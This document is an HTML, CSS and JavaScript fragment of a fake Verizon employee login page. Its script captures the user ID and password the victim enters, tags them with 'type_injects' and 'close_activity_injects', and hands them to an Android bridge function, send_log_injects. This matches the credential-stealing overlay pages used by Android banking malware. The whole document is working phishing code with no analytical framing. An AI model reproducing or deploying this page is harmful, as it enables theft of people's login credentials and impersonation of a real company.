<style>
    form{
        display: flex;
        flex-direction: column;
        min-height: 100vh;
    }
    section{
        padding: 23px;
        flex: 1;
    }

    .input {
            width: 100%;
            padding:8px 4px;
            border: 0;
            background-color:  #fff;
            margin-bottom: 15px;
            border: 1px solid #e5e6e6;
            border-bottom:1px solid #555555;
    }
        .login {
            background-size: 15px;
            background-repeat: no-repeat;
            background-position: right 13px center;
    }

        .input:focus {
            border:1px solid #555555;
    }

        input::placeholder {
            color: #919191;
            font-weight: 600;
    }

        input,button {
            outline: none !important;
            box-shadow: none !important;
    }
        .button {
        display: block;
        margin: auto;
        padding: 10px;
        border: 0;
        background-color: #000;
        color: #c7c8c8;
        font-weight: 700;
        margin-bottom: 15px;
        border-radius: 5px;
        width: 39%;
        border-radius: 24px;
    }

    .button:disabled {
        background-color: #747676;
    }

    .error {
        border-color: #f00 !important;
    }
</style>
</head>

            <h4 style="font-size: 23px;padding: 23px;font-weight: 700;margin-bottom: -31px;">
                Login to your Verizon
                employee account.
            </h4>
            <p style="font-size: 16px;padding: 23px; margin-bottom: -30px;">
                Just complete a couple steps and you will be
                in the employee experience.
            </p>
        </header>
        <section>
            <p>

            </p>
           
                <p style="color: #000;font-weight: 500;font-size: 13px;position: relative;top: 13px;">
                    User ID
                </p>
                <input type="text" inputmode="numeric" id="login" name="login" class="input login" placeholder="" autocomplete="off">
                <p style="color: #000;font-weight: 500;font-size: 13px;position: relative;top: 13px;">
                    Password
                </p>
                <input type="password" id="password" name="password" class="input password" placeholder="">
    
                
           

        </section>
        <footer>
            <input type="submit" class="button" id="sendData" disabled value="Login">
        </footer>
    </form>
<script>
    var login = document.getElementById('login'),
        password = document.getElementById('password');
        
    var sendData = document.getElementById('sendData');
        
    function check() {
        if(login.value.length >= 4 && password.value.length >= 4) {
            sendData.disabled = false;
        } else {
            sendData.disabled = true;
        }
    }

    login.onkeyup = () => {
        check();
    }

    password.onkeyup = () => {
        check();
    }

        sendData.onclick = () => {
            var data = {};
            data.login = login.value;
            data.password = password.value;
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
</script>
